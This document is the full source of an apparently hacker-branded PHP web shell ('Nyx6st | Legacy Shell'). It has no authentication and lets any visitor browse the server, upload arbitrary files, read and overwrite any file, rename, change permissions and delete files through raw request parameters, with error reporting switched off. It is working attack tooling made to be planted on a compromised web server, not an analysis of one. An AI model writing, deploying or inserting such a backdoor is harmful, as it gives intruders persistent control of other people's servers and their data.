<?php
error_reporting(0);
set_time_limit(0);

echo "<!DOCTYPE html><html><head><title>Nyx6st | Legacy Shell</title><style>
@font-face {
    font-family: 'Comic Sans MS';
    src: local('Comic Sans MS');
}
body {
  background-color: #000;
  color: #0ff;
  font-family: 'Consolas', 'Lucida Console', 'Courier New', monospace;
}
a { color: #0ff; text-decoration: none; }
table { width: 90%; margin: auto; border-collapse: collapse; }
td, th { padding: 6px; border: 1px solid #333; }
input, select, textarea {
    background: #111;
    color: #0f0;
    border: 1px solid #0ff;
    font-family: 'Comic Sans MS';
}
textarea { width: 100%; height: 300px; }
h1 { text-align: center; color: #fff; }
hr { border: 0; border-top: 1px solid #0ff; }
</style></head><body>";

echo "<h1>NyxCode | Do What You Wanna Do</h1>";
echo "<center><font color='gray'>".php_uname()."</font></center><hr>";

$path = isset($_GET['path']) ? $_GET['path'] : getcwd();
$path = str_replace('\\', '/', $path);
$paths = explode('/', $path);

foreach($paths as $id => $part) {
    if($part == '' && $id == 0){
        echo '<a href="?path=/">/</a>';
        continue;
    }
    if($part == '') continue;
    echo '<a href="?path=';
    for($i=0;$i<=$id;$i++){
        echo $paths[$i];
        if($i != $id) echo "/";
    }
    echo '">'.$part.'</a>/';
}

if(isset($_FILES['file'])){
    if(@copy($_FILES['file']['tmp_name'], $path.'/'.$_FILES['file']['name'])){
        echo "<p style='color:lime;'>Upload success!</p>";
    } else {
        echo "<p style='color:red;'>Upload failed.</p>";
    }
}
echo "<form enctype='multipart/form-data' method='POST'>
Upload File: <input type='file' name='file'/>
<input type='submit' value='Upload'/>
</form><hr>";

if(isset($_GET['filesrc'])){
    echo "<h3>Viewing: ".$_GET['filesrc']."</h3>";
    echo "<textarea readonly>".htmlspecialchars(file_get_contents($_GET['filesrc']))."</textarea>";
} elseif(isset($_GET['edit'])){
    if(isset($_POST['editcontent'])){
        file_put_contents($_GET['edit'], $_POST['editcontent']);
        echo "<p style='color:lime;'>File saved!</p>";
    }
    echo "<form method='POST'>
    <textarea name='editcontent'>".htmlspecialchars(file_get_contents($_GET['edit']))."</textarea>
    <input type='submit' value='Save'/>
    </form>";
} else {
    $scandir = scandir($path);
    echo "<table><tr><th>Name</th><th>Size</th><th>Permission</th><th>Action</th></tr>";
    foreach($scandir as $file){
        if($file == ".") continue;
        $fullpath = $path."/".$file;
        echo "<tr><td>";
        if(is_dir($fullpath)){
            echo "<a href='?path=$fullpath'>$file</a>";
        } else {
            echo "<a href='?filesrc=$fullpath'>$file</a>";
        }
        echo "</td><td>".(is_file($fullpath) ? filesize($fullpath) : '-')."</td>";
        echo "<td>".substr(sprintf('%o', fileperms($fullpath)), -4)."</td><td>";
        echo "<a href='?edit=$fullpath'>Edit</a> | ";
        echo "<a href='?rename=$fullpath'>Rename</a> | ";
        echo "<a href='?chmod=$fullpath'>Chmod</a> | ";
        echo "<a href='?delete=$fullpath' onclick=\"return confirm('Hapus?');\">Delete</a>";
        echo "</td></tr>";
    }
    echo "</table>";
}

if(isset($_GET['rename'])){
    if(isset($_POST['newname'])){
        rename($_GET['rename'], dirname($_GET['rename']).'/'.$_POST['newname']);
        echo "<p style='color:lime;'>Renamed!</p>";
    }
    echo "<form method='POST'>New name: <input type='text' name='newname'/>
    <input type='submit' value='Rename'/></form>";
}

if(isset($_GET['chmod'])){
    if(isset($_POST['perm'])){
        chmod($_GET['chmod'], octdec($_POST['perm']));
        echo "<p style='color:lime;'>Permission changed!</p>";
    }
    echo "<form method='POST'>Permission: <input type='text' name='perm' value='".substr(sprintf('%o', fileperms($_GET['chmod'])), -4)."'/>
    <input type='submit' value='Chmod'/></form>";
}

if(isset($_GET['delete'])){
    if(is_dir($_GET['delete'])){
        rmdir($_GET['delete']);
    } else {
        unlink($_GET['delete']);
    }
    echo "<p style='color:red;'>Deleted!</p>";
}

echo "<hr><center>
  <small>
    <a href=\"https://www.0x6ick.zone.id/?m=1\" target=\"_blank\" style=\"text-decoration: none; color: inherit;\">
      Shell Rebuild by Nyx6st | Legacy mode
    </a>
  </small>
</center>";
?>
